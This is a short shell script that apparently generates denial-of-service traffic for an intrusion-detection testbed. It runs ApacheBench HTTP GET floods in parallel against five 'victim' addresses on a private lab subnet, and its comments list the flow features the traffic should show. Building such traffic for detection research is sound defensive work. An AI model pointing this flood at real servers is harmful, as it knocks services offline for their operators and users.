#!/bin/sh
# http_flood.sh - HTTP GET flood using Apache Benchmark against all victim nodes.
# Unlike the SYN flood, this generates complete TCP flows with real responses:
# fwd_act_data_pkts > 0, psh_flag_cnt high, bwd_pkt_len_std > 0.
# Signature: high volume + full handshake + application-layer data.
# All 5 nodes targeted in parallel - realistic campaign flooding entire subnet.
COUNT=${1:-10000}
CONC=${2:-100}

VICTIMS="172.20.0.10 172.20.0.11 172.20.0.12 172.20.0.13 172.20.0.14"

echo "[attack] HTTP GET flood -> all nodes  $COUNT requests  concurrency $CONC"
for ip in $VICTIMS; do
    ab -n "$COUNT" -c "$CONC" "http://$ip/" &
done
wait
